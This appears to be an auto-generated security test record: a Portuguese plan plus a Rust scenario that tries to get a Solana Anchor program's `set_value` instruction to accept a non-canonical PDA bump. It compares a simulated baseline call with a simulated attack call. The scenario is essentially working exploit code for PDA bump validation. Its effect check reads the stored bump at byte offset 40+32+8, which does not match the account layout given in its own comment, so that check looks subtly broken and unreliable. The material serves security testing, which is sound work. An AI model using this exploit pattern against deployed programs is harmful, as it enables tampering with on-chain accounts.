{
  "plan": "O programa `set_value` recebe uma conta `data_account` e um `user` signer, e valida que `data_account` é o PDA derivado de ["data", user.key, bump] usando `create_program_address` com o bump fornecido. O baseline usa o bump canônico (maior bump válido) para o user, provando que o cenário está correto. O ataque tenta usar um bump não canônico (menor que o canônico) para o mesmo user, gerando um endereço diferente do PDA canônico. O efeito medido é que a conta resultante tem endereço diferente do PDA canônico e o campo `bump` armazenado é o bump não canônico, demonstrando que a instrução aceitou um PDA não canônico.",
  "scenario": "let user = Pubkey::new_unique();
let (canonical_pda, canonical_bump) = Pubkey::find_program_address(&[b"data", user.as_ref()], &env.program_id);

// Encontrar um bump não canônico (menor que o canônico) para o qual create_program_address retorna Ok
let mut non_canonical_bump = canonical_bump - 1;
let mut non_canonical_pda = Pubkey::create_program_address(&[b"data", user.as_ref(), &[non_canonical_bump]], &env.program_id);
while non_canonical_pda.is_err() && non_canonical_bump > 0 {
    non_canonical_bump -= 1;
    non_canonical_pda = Pubkey::create_program_address(&[b"data", user.as_ref(), &[non_canonical_bump]], &env.program_id);
}
let non_canonical_pda = non_canonical_pda.unwrap();

// Conta data_account para o baseline (PDA canônico)
let data_account_data = anchor_account_data("DataAccount", &(user, 0u64, canonical_bump));
let data_account = account(&env.program_id, &data_account_data, None);

// Conta data_account para o ataque (PDA não canônico)
let attack_data_account_data = anchor_account_data("DataAccount", &(user, 0u64, non_canonical_bump));
let attack_data_account = account(&env.program_id, &attack_data_account_data, None);

// Baseline: usar o bump canônico
let baseline_ix = env.anchor_ix(
    "set_value",
    &(canonical_bump, 42u64),
    vec![
        AccountMeta::new(canonical_pda, false),
        AccountMeta::new_readonly(user, true),
    ],
);
let baseline_accounts = vec![
    (canonical_pda, data_account),
    (user, wallet(1_000_000_000)),
];
let baseline_result = env.baseline("uso legitimo com bump canonico", &baseline_ix, &baseline_accounts);

// Ataque: usar o bump não canônico
let attack_ix = env.anchor_ix(
    "set_value",
    &(non_canonical_bump, 99u64),
    vec![
        AccountMeta::new(non_canonical_pda, false),
        AccountMeta::new_readonly(user, true),
    ],
);
let attack_accounts = vec![
    (non_canonical_pda, attack_data_account),
    (user, wallet(1_000_000_000)),
];
let attack_result = env.attack("tentativa com bump nao canonico", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let data_after = after(&attack_result, &non_canonical_pda);
    let stored_bump = data_after.data()[40 + 32 + 8]; // user(32) + value(8) + bump(1)
    env.effect(
        "PDA nao canonico aceito: endereco diferente do canonico e bump armazenado igual ao bump nao canonico",
        non_canonical_pda != canonical_pda && stored_bump == non_canonical_bump,
    );
}"
}

